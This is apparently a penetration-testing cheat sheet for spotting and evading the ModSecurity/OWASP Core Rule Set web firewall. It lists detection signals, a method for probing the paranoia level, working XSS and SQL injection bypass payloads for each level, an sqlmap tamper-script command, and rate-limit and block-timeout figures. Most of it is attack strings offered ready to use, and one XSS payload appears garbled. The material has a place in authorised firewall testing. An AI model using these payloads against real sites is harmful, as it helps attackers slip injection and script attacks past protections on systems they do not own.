# ModSecurity / OWASP CRS

### Detection Signals
| Signal | Where |
|--------|-------|
| `ModSecurity` in error page | 403 response body |
| `server: Apache/2.x` + 403 pattern | Common combo |
| `Mod_Security` or `NOYB` in `Server` header | Sometimes exposed |
| Paranoia Level behavior | PL1: basic, PL2: stricter, PL3-4: very strict |
| `id "9XXXXX"` in error body | CRS rule IDs |

### Bypass Strategy
- **Recommended tool**: curl/Burp for testing, sqlmap tamper scripts for automation
- **Key insight**: CRS is rule-based with Paranoia Levels. PL1 (default) has many bypasses. PL3+ is very hard to bypass.
- **Detect PL first**: Send increasingly suspicious requests. If basic `<script>alert(1)</script>` passes, PL is low.
- **Double encoding**: Works when app decodes URL params before passing to backend but WAF checks raw input.

### XSS Bypass
```
# CRS PL1 bypasses:
<img/src=x onerror=alert(1)>  (no space before src)
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d="M0"><animate attributeName=d values="M0&#10telerik" /><set attributeName=d to="M0 "/>

# CRS PL2 bypasses:
<svg/onload=alert`1`>
<input autofocus onfocus=alert(1)>

# CRS PL3+ (very difficult):
# Typically requires application-level context exploitation
# Try: DOM-based via URL fragment (WAF doesn't inspect fragments)
```

### SQLi Bypass
```
# CRS PL1-2 sqlmap tamper scripts:
sqlmap --tamper=space2comment,between,charencode,equaltolike,greatest -u URL

# Manual CRS bypasses:
' OR 1=(SELECT 1 WHERE 1=1)--
' /*!50000OR*/ /*!50000 1=1*/--
'%0aOR%0a1=1--%0a
' AND 1 LIKE 1--

# Scientific notation bypass:
' OR 1e0=1e0--
' AND 3>-1#

# JSON inline (if application accepts):
{"user":"admin'/**/OR/**/1=1--"}
```

### Rate Limiting
- Not built-in to ModSecurity core. Depends on additional modules (mod_evasive, mod_qos).
- If present: usually 20-50 req/s before block.
- Recovery: IP unblocked after configured timeout (often 300s).

### Origin IP Discovery
- N/A (ModSecurity runs on origin server, not CDN). The IP you see IS the origin.

---

